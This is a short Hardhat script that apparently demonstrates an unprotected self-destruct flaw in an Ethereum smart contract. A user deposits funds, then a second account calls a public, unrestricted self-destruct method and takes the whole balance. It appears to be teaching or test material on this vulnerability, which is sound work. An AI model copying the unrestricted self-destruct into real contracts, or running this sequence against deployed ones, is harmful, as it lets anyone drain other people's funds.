const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

/**
 * What will happen: 
 * 
 * - anyone can deposit funds into the contract 
 * - anyone can self-destruct the contract and claim all of the funds 
 */
Runner.run(async (provider, owner, addr1) => {
    const contract = await utils.deployContract("SelfDestruct"); 
    console.log();
    
    //a user deposits some funds 
    await contract.takeMyMoney({value:10000}); 
    console.log(`contract balance is ${await provider.getBalance(contract.address)}`);
    
    //the self-destruct method is public and unrestricted 
    await contract.connect(addr1).getFreeMoney(addr1.address); 
    console.log(`contract balance is ${await provider.getBalance(contract.address)}`);
});
